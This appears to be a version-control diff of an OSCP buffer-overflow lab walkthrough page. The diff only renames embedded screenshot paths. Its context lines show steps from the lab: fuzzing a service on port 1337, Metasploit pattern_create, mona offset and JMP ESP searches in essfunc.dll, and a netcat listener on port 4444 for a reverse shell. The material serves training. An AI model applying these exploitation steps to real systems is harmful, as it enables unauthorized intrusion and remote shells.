@@ -1481,7 +1481,7 @@ python fuzzer.py $VICTIM 1337
 
 Program crashed at 400 bytes with fuzzer.py
 
-<figure><img src="../../.gitbook/assets/image (50).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (50) (1).png" alt=""><figcaption></figcaption></figure>
 
 ```
 /opt/metasploit-framework-5101/tools/exploit/pattern_create.rb -l 400
@@ -1537,7 +1537,7 @@ python exploit.py $VICTIM 1337
 !mona findmsp -distance 400
 ```
 
-<figure><img src="../../.gitbook/assets/image (49).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (49) (1).png" alt=""><figcaption></figcaption></figure>
 
 **exploit.py - Code Changes #2**
 
@@ -1905,7 +1905,7 @@ python exploit.py $VICTIM 1337
 !mona findmsp -distance 1100
 ```
 
-<figure><img src="../../.gitbook/assets/image (43).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (43) (3).png" alt=""><figcaption></figcaption></figure>
 
 **exploit.py - Code Changes #2**
 
@@ -2269,7 +2269,7 @@ python exploit.py $VICTIM 1337
 !mona findmsp -distance 1400
 ```
 
-<figure><img src="../../.gitbook/assets/image (42).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (42) (2).png" alt=""><figcaption></figcaption></figure>
 
 **exploit.py - Code Changes #2**
 
@@ -2403,7 +2403,7 @@ We find that essfunc.dll has 9 possible JMP ESPs to use. So we will start with t
 !mona find -s "\xff\xe4" -m essfunc.dll
 ```
 
-<figure><img src="../../.gitbook/assets/image (38).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (38) (2).png" alt=""><figcaption></figcaption></figure>
 
 ### Exploit
 
@@ -2478,7 +2478,7 @@ nc -lvnp 4444
 python exploit.py $VICTIM 1337
 ```
 
-<figure><img src="../../.gitbook/assets/image (41).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (41) (2).png" alt=""><figcaption></figcaption></figure>
 
 ## oscp.exe - OVERFLOW8
 
@@ -3282,7 +3282,7 @@ python fuzzer.py $VICTIM 1337
 
 Program crashed at 600 bytes with fuzzer.py
 
-<figure><img src="../../.gitbook/assets/image (39).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (39) (2).png" alt=""><figcaption></figcaption></figure>
 
 ```
 /opt/metasploit-framework-5101/tools/exploit/pattern_create.rb -l 600
@@ -3450,7 +3450,7 @@ except:
 
 <figure><img src="../../.gitbook/assets/image (14) (5).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/image (5) (3) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (5) (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### Finding a Jump Point
 
@@ -3552,5 +3552,5 @@ nc -lvnp 4444
 python exploit.py $VICTIM 1337
 ```
 
-<figure><img src="../../.gitbook/assets/image (40).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (40) (2).png" alt=""><figcaption></figcaption></figure>
 
